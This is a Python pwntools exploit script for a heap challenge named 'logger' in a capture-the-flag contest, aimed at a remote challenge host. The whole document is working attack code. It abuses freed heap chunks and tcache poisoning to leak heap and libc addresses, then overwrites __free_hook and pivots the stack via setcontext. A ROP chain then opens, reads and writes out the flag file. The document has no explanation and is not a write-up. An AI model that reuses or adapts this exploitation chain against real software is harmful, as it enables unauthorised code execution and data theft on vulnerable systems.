#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./logger', aslr=False)
r = remote('chals1.eof.ais3.org', 45125)

def new(idx, _len, msg):
    r.sendlineafter('> ', '1')
    r.sendlineafter('idx: ', str(idx))
    r.sendlineafter('len: ', str(_len))
    if _len != 1:
        r.sendafter('msg: ', msg)

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('idx: ', str(idx))

def show(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('idx: ', str(idx))

def edit(idx, msg):
    r.sendlineafter('> ', '4')
    r.sendlineafter('idx: ', str(idx))
    r.sendafter('msg: ', msg)

def get_name(name, namelen):
    r.sendlineafter('len: ', str(namelen))
    r.sendafter('name: ', name)

get_name('', 1)
new(0, 0x48, '\n')
new(1, 0x48, '\n')
new(2, 0x48, '\n')
delete(1)
delete(2)
delete(0)
new(0, 0x88, '\n')
edit(7, '\n')
show(0)
r.recvuntil('msg: ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0xfb0
info(f"heap: {hex(heap)}")

edit(0, p64(heap + 0xff0) + b'\n')
new(1, 0xf8, '\n')
new(2, 0xf8, '\n')
new(3, 0xf8, '\n')
fake_chk = p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)
new(4, 0xf8, b'\x00'*0x30 + fake_chk + b'\n')
delete(1)
delete(2)
delete(3)
new(1, 0x48, b'\n')
new(2, 0x48, b'\n')
new(3, 0x48, p64(0) + p64(0x421) + b'\n')
delete(2)
show(0)
r.recvuntil('msg: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
__free_hook = libc + 0x1eeb28
info(f"libc: {hex(libc)}")

new(5, 0xb8, b'\n')
new(6, 0xb8, b'\n')
delete(6)
delete(5)
edit(0, p64(__free_hook) + b'\n')

# ref: https://shorturl.at/ruBHS
# control_rdx_gadget == getkeyserv_handle+576
control_rdx_gadget = libc + 0x154930 # mov rdx,QWORD PTR [rdi+0x8] ; mov QWORD PTR [rsp],rax ; call QWORD PTR [rdx+0x20]
# stack_pivoting_gadget == setcontext+61
stack_pivoting_gadget = libc + 0x580dd
rop_read = libc + 0x111130
rop_write = libc + 0x1111d0
rop_openat = libc + 0x110fe0
rop_exit = libc + 0x49bc0
rop_pop_rdi_ret = libc + 0x26b72
rop_pop_rsi_ret = libc + 0x27529
rop_pop_rdx_ret = libc + 0xd27a5
rop_add_rsp_0x18_ret = libc + 0x3794a
flag_str = __free_hook + 0x10
"""
20 - setcontext_gadget
28 - r8
30 - r9
48 - r12
50 - r13
58 - r14
60 - r15
68 - rdi
70 - rsi
78 - rbp
80 - rbx
88 - rdx
98 - rcx ; second
a0 - rsp
a8 - rcx ; first and will be push to stack
"""
output_fd = 0 # will work at remote env
rop = flat(
    stack_pivoting_gadget, rop_pop_rdi_ret, # 0x20
    3, rop_pop_rsi_ret, # 0x30
    heap, rop_pop_rdx_ret, # 0x40
    0x30, rop_read, # 0x50
    rop_add_rsp_0x18_ret, 0, # 0x60
    flag_str, heap + 0x2000, # 0x70
    rop_pop_rdi_ret, output_fd, # 0x80
    rop_write, rop_exit, # 0x90
    heap + 0x1000 + 0x8, rop_openat, # 0xa0
)
new(5, 0xb8, rop + b'\n') # heap + 0x1000
new(6, 0xb8, p64(control_rdx_gadget) + p64(heap + 0x1000 - 0x20) + b'/home/logger/flag\x00' + b'\n')

delete(6)
r.interactive()